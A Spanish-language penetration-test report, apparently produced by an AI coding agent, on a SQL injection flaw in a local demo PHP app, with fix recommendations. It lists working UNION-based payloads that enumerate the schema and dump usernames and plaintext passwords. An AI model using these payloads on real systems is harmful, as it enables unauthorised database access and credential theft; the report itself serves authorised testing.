# Informe de Auditoría de Seguridad – SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30  
**Hora:** 15:35:38 UTC  
**Analista:** GitHub Copilot CLI (claude-sonnet-4.6)  

---

## 1. Resumen Ejecutivo

Se detectó y explotó una vulnerabilidad crítica de **SQL Injection** en el parámetro `id` de la aplicación web. La vulnerabilidad permite a un atacante no autenticado extraer toda la información de la base de datos, incluyendo credenciales de usuario en texto plano.

| Métrica | Valor |
|---|---|
| Vulnerabilidad | SQL Injection (UNION-based + Error-based) |
| Severidad | **CRÍTICA** |
| CVSS v3 estimado | 9.8 (Critical) |
| Parámetro afectado | `id` (GET) |
| URL afectada | `http://web.dev.local:8083/?id=` |

---

## 2. Descripción del Entorno

- **Servidor web:** PHP (low.php)
- **Base de datos:** MariaDB 10.11.14-ubu2204
- **Usuario de BD:** `root@172.18.0.3` (máximos privilegios)
- **Base de datos activa:** `sqli_demo`
- **Directorio de datos MySQL:** `/var/lib/mysql/`

---

## 3. Descripción de la Vulnerabilidad

### 3.1 Tipo
**SQL Injection – UNION-based / Error-based**

### 3.2 Localización
- **URL:** `http://web.dev.local:8083/`
- **Parámetro:** `id` (método GET)
- **Fichero fuente:** `/var/www/html/low.php`, línea 11

### 3.3 Causa
El parámetro `id` se concatena directamente en la consulta SQL sin sanitización ni uso de consultas preparadas (prepared statements). La consulta vulnerable tiene la forma:

```sql
SELECT first_name, last_name FROM users WHERE id='[INPUT_SIN_SANITIZAR]'
```

### 3.4 Detección

**Prueba de comilla simple** – genera error de sintaxis SQL:
```
GET /?id=1'&Submit=Submit
```
Respuesta del servidor:
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax;
check the manual that corresponds to your MariaDB server version for the right 
syntax to use near ''1''' at line 1 in /var/www/html/low.php:11
```

**Confirmación con ORDER BY** – determina el número de columnas:
```
GET /?id=1' ORDER BY 2-- -&Submit=Submit  → OK (2 columnas)
GET /?id=1' ORDER BY 3-- -&Submit=Submit  → ERROR (Unknown column '3' in 'ORDER BY')
```

---

## 4. Explotación

### 4.1 Identificación del número de columnas
```
GET /?id=1' ORDER BY 2-- -&Submit=Submit
```
Resultado: **2 columnas** (`first_name`, `last_name`)

### 4.2 Extracción de información del sistema

```
GET /?id=-1' UNION SELECT user(),database()-- -&Submit=Submit
```
Resultado:
- **Usuario DB:** `root@172.18.0.3`
- **Base de datos:** `sqli_demo`

```
GET /?id=-1' UNION SELECT @@version,@@datadir-- -&Submit=Submit
```
Resultado:
- **Versión:** `10.11.14-MariaDB-ubu2204`
- **Datadir:** `/var/lib/mysql/`

### 4.3 Enumeración de tablas
```
GET /?id=-1' UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema=database()-- -&Submit=Submit
```
Resultado: tabla **`users`** en base de datos `sqli_demo`

### 4.4 Enumeración de columnas de la tabla `users`
```
GET /?id=-1' UNION SELECT column_name,column_type FROM information_schema.columns WHERE table_name='users'-- -&Submit=Submit
```

| Columna | Tipo |
|---|---|
| user_id | int(11) |
| first_name | varchar(50) |
| last_name | varchar(50) |
| username | varchar(50) |
| password | varchar(255) |
| email | varchar(100) |

### 4.5 Extracción de credenciales
```
GET /?id=-1' UNION SELECT GROUP_CONCAT(user_id,0x3a,username,0x3a,password SEPARATOR '|'),2 FROM sqli_demo.users-- -&Submit=Submit
```

**Credenciales extraídas (texto plano):**

| ID | Usuario | Contraseña |
|---|---|---|
| 1 | admin | password123 |
| 2 | jsmith | secret456 |
| 3 | bjohnson | mypass789 |
| 4 | awilliams | qwerty123 |
| 5 | cbrown | password |
| 6 | ddavis | secure123 |
| 7 | emiller | hackme |
| 8 | fwilson | admin123 |

> ⚠️ Las contraseñas están almacenadas en **texto plano**, lo que agrava significativamente el impacto.

---

## 5. Impacto

| Aspecto | Descripción |
|---|---|
| **Confidencialidad** | ALTO – Exposición total de la base de datos, incluyendo credenciales |
| **Integridad** | ALTO – Posible modificación/eliminación de datos (usuario `root`) |
| **Disponibilidad** | MEDIO – Posible denegación de servicio mediante DROP TABLE/DATABASE |
| **Escalada de privilegios** | ALTO – Usuario `root` de MySQL con acceso a todas las bases de datos del servidor |

---

## 6. Recomendaciones

### 6.1 Solución inmediata (Crítica)
1. **Usar consultas preparadas (Prepared Statements):**
   ```php
   $stmt = $mysqli->prepare("SELECT first_name, last_name FROM users WHERE id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar la entrada:** verificar que `id` sea un entero válido antes de usarlo.

### 6.2 Medidas adicionales
3. **Almacenar contraseñas con hash seguro** (bcrypt, Argon2) – nunca en texto plano.
4. **Principio de mínimo privilegio:** la aplicación no debe conectarse a la BD con el usuario `root`; crear un usuario con permisos mínimos (SELECT únicamente sobre las tablas necesarias).
5. **Deshabilitar la visualización de errores en producción** para no exponer rutas, versiones ni trazas de pila.
6. **Implementar WAF (Web Application Firewall)** como medida de defensa en profundidad.
7. **Auditoría de código** completa para detectar otros posibles puntos de inyección.

---

## 7. Conclusión

La aplicación web en `http://web.dev.local:8083` presenta una vulnerabilidad **crítica** de SQL Injection que permite la extracción completa de la base de datos sin autenticación previa. Se explotó con éxito recuperando las credenciales de **8 usuarios**, incluyendo el administrador. La combinación de entrada no sanitizada, usuario root de base de datos y contraseñas en texto plano representa un riesgo extremadamente alto que debe ser corregido de inmediato.

---

*Informe generado automáticamente por GitHub Copilot CLI – Análisis de seguridad autorizado*
